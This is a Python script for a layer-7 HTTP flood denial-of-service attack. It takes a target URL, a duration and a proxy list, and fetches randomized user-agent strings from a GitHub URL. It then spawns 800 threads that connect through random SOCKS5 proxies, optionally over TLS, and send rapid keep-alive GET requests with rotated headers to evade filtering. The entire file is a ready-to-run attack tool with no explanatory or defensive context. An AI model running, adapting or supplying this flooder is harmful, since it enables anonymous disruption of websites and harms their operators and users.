import socket
import ssl
import time
import threading
import random
import sys
import socks
import requests

try:
    target = str(sys.argv[1])
    timer = float(sys.argv[2])
    proxiesfile = str(sys.argv[3])
except:
    sys.exit()

proxies = open(proxiesfile).read().split()

timeout = time.time() + 1 * timer

start = False

port = 443

useragents = requests.get("https://raw.githubusercontent.com/MrRage867/Big-lists/main/UserAgents.txt").text.split("\n")

acceptall = [
             "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
             "Accept-Encoding: gzip, deflate\r\n",
             "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
             "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
             "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
             "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
             "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
             "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
             "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
             "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
             "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
             "Accept: text/html, application/xhtml+xml\r\n",
             "Accept-Language: en-US,en;q=0.5\r\n",
             "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
             "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"
             ]

if target[:7] == "http://":
    port = 80
    target = target[7:]
if target[:8] == "https://":
    port = 443
    target = target[8:]
target = target.split("/")
try:
    path = "/"+target[1]
except:
    path = "/"
target = target[0]

def attack():
    while time.time() < timeout:
        proxy = random.choice(proxies).split(":")
        s = socks.socksocket()
        s.settimeout(5)
        try:
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((target, port))
            if port == 443:
                s = ssl.SSLContext().wrap_socket(s,server_hostname=target)
            for x in range(64):
                s.send(str.encode("GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + random.choice(useragents) + "\r\n" + random.choice(acceptall) + "Connection: keep-alive\r\n\r\n"))
                time.sleep(0.05)
        except:
            s.close()
    return
    sys.exit()

for x in range(800):
    try:
        time.sleep(0.007)
        threading.Thread(target=attack).start()
    except:
        sys.exit()